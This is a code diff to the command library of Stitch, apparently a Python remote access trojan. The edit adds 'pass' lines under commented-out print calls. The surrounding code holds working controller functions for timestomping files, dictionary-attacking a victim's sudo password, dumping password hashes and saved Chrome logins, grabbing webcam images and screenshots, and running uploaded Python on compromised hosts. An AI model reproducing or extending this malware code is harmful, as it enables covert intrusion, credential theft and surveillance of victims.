@@ -74,6 +74,7 @@ class stitch_commands_library:
     # Filesystem utilities used by web interface
     def mkdir(self, args):
         if not args:
+            pass
     # st_print('[*] Usage: mkdir [directory]')
             return
         if windows_client(system=self.cli_os):
@@ -85,6 +86,7 @@ class stitch_commands_library:
 
     def mv(self, args):
         if not args:
+            pass
     # st_print('[*] Usage: mv [source] [destination]')
             return
         if windows_client(system=self.cli_os):
@@ -96,6 +98,7 @@ class stitch_commands_library:
 
     def rm(self, args):
         if not args:
+            pass
     # st_print('[*] Usage: rm [path]')
             return
         if windows_client(system=self.cli_os):
@@ -107,6 +110,7 @@ class stitch_commands_library:
 
     def timestomp(self, mode, file_path):
         if not file_path:
+            pass
     # st_print('[*] Usage: timestomp [a|c|m] [file]')
             return
         if mode == 'a':
@@ -116,6 +120,7 @@ class stitch_commands_library:
         elif mode == 'm':
             self.editmodified(file_path)
         else:
+            pass
     # st_print('[!] Unknown timestomp mode. Use a/c/m')
 
     def history_check(self):
@@ -140,6 +145,7 @@ class stitch_commands_library:
                 self.send('echo hello')
                 self.receive()
             except Exception as e:
+                pass
     # st_print("[!] Connection has been lost.")
                 st_log.error('Exception:\n{}'.format(str(e)))
                 return False
@@ -178,11 +184,14 @@ class stitch_commands_library:
             while response != st_complete.decode('utf-8'):
                 response=self.receive()
                 if response != st_complete.decode('utf-8'):
+                    pass
     # print('\b')+ response,
                 else:
+                    pass
     # print("\n")
                     break
         else:
+            pass
     # st_print(response)
 
     def cd(self, path):
@@ -191,6 +200,7 @@ class stitch_commands_library:
             self.send(path)
             response=self.receive()
             if not no_error(response):
+                pass
     # st_print(response)
             else:
                 pass
@@ -210,14 +220,17 @@ class stitch_commands_library:
             n = n.strip()
             resp = self.receive()
             if 'sudo_failed' in resp:
+                pass
     # st_print('[*] Currently running with sudo privileges, unable to start dictionary attack.\n')
                 return
             if 'sudo_success' in resp:
                 self.send(n)
                 resp = self.receive()
                 if 'password_failed' in resp:
+                    pass
     # st_print('[-] {}'.format(n))
                 if 'password_cracked' in resp:
+                    pass
     # st_print('[+] Password: {}'.format(n))
                     st_logger(n,self.cli_dwld,'sudo_password')
                     cracked = True
@@ -245,6 +258,7 @@ class stitch_commands_library:
         if not os.path.exists(self.cli_dwld):
             os.mkdir(self.cli_dwld)
         if len(dwld) > 0:
+            pass
     # st_print('[*] Beginning download of {}...'.format(f_name))
             if f_name.endswith('\\') or f_name.endswith('/'):
                 d_file = f_name[:-1]
@@ -286,10 +300,13 @@ class stitch_commands_library:
                                 download_bar.complete()
     # st_print("[+] Download succesful: %s\n" % downld)
                 else:
+                    pass
     # st_print('[!] Size of "{}" is not a valid int'.format(size))
             else:
+                pass
     # st_print(size)
         else:
+            pass
     # st_print('[*] Download usage: [download] [filepath]\n')
 
     def environment(self):
@@ -368,10 +385,12 @@ class stitch_commands_library:
             self.pyexec('hashdump.py',pylib=True)
             resp = self.receive()
             if no_error(resp):
+                pass
     # st_print(resp)
     # st_print(self.receive())
     # st_print(self.receive())
             else:
+                pass
     # st_print(resp)
         if osx_client(system=self.cli_os):
             self.pyexec('hashdump.py',pylib=True)
@@ -534,6 +553,7 @@ class stitch_commands_library:
                 py_file_path = os.path.join(uploads_path,py_file)
             if os.path.exists(py_file_path):
                 if not py_file.endswith('.py') or os.path.isdir(py_file_path):
+                    pass
     # st_print("[!] Only Python scripts located in %s can use pyexec.\n" %(dir_path))
                     return
                 with open(py_file_path,'rb') as c:
@@ -547,8 +567,10 @@ class stitch_commands_library:
                     self.send('pyexec'+ code)
     # st_print(self.receive())
             else:
+                pass
     # st_print('[!] %s is not located in %s.\n' % (py_file,dir_path))
         else:
+            pass
     # st_print('[!] File name is required.\n')
 
     def screenshot(self):
@@ -626,6 +648,7 @@ class stitch_commands_library:
                 os.remove(u_zip_path)
     # st_print(self.receive())
             else:
+                pass
     # st_print('[!] {} is not located in {}.\n'.format(u_file,uploads_path))
                 self.send("ERROR")
 
@@ -650,6 +673,7 @@ class stitch_commands_library:
                 os.remove(os.path.join(uploads_path,'.st_imsnp'))
         resp = self.receive()
         if no_error(resp):
+            pass
     # st_print(resp)
             sc = os.path.join(self.cli_temp,'wb.jpg')
             self.download(sc)
@@ -660,14 +684,17 @@ class stitch_commands_library:
             self.send(cmd)
             self.receive()
         else:
+            pass
     # st_print(resp)
 
     def webcamlist(self):
         self.pyexec('webcamList.py',pylib=True)
         resp = self.receive()
         if windows_client(system=self.cli_os):
+            pass
     # st_print(resp)
             if no_error(resp):
+                pass
     # st_print(self.receive())
         else:
             if resp == 'upload_imgsnap':
@@ -677,6 +704,7 @@ class stitch_commands_library:
             resp = self.receive()
     # st_print(resp)
             if no_error(resp):
+                pass
     # st_print(self.receive())
 
 ################################################################################
@@ -739,12 +767,16 @@ class stitch_commands_library:
                             os.remove(zip_loc)
                             os.remove(chrome_path)
                             if (e == 'database is locked'):
+                                pass
     # st_print('[!] Make sure Google Chrome is not running in the background')
                             elif (e == 'no such table: logins'):
+                                pass
     # st_print('[!] Something is wrong with the database name')
                             elif (e == 'unable to open database file'):
+                                pass
     # st_print('[!] Something is wrong with the database path')
                             else:
+                                pass
     # st_print(e)
                     connection.close()
                     os.remove(zip_loc)
@@ -753,8 +785,10 @@ class stitch_commands_library:
     # st_print(info_list)
                     st_logger(info_list,self.cli_dwld,'chromedump')
             else:
+                pass
     # st_print(resp)
         else:
+            pass
     # st_print('[*] Must be running Stitch on a windows machine to use this function.\n')
 
     def drives(self):
@@ -888,10 +922,12 @@ class stitch_commands_library:
         try:
             ssh_host = input("\nPlease enter ssh hostname: ")
             if 'exit' in ssh_host:
+                pass
     # print('\n')
                 return
             ssh_user = input("\nPlease enter ssh user: ")
             if 'exit' in ssh_user:
+                pass
     # print('\n')
                 return
             ssh_pass = getpass("\nPlease enter password for {}: ".format(ssh_user))
@@ -915,6 +951,7 @@ class stitch_commands_library:
                     if ssh_cmd == 'exit': break
     # st_print(self.receive())
         else:
+            pass
     # st_print('{}\n'.format(prompt))
 
     def sudo(self, line):
@@ -929,6 +966,7 @@ class stitch_commands_library:
                 su_pass = getpass("\nSorry incorrect\nPlease enter sudo password:")
                 self.send(su_pass)
             if resp == 'sudo: 3 incorrect password attempts':
+                pass
     # st_print('sudo: 3 incorrect password attempts\n')
                 return
             resp = self.receive()
